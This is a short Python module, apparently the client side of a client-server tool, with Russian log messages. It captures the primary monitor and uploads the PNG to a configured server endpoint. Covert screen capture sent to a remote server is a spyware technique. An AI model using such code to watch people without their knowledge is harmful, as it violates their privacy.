import requests
from mss import mss
from mss.tools import to_png
from client.config import SERVER_URL
from client.logger_config import setup_logger

logger = setup_logger()

def take_screenshot():
    sct = mss()
    try:
        screenshot = sct.grab(sct.monitors[1])
        screenshot_data = to_png(screenshot.rgb, screenshot.size)
        logger.info("Отправка скриншота на сервер...")
        response = requests.post(
            f"{SERVER_URL}/screenshot",
            data=screenshot_data,
            headers={"Content-Type": "image/png"}
        )
        if response.status_code == 200:
            logger.info("Скриншот успешно отправлен.")
        else:
            logger.error(f"Ошибка отправки скриншота: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error("Ошибка захвата или отправки скриншота: " + str(e))
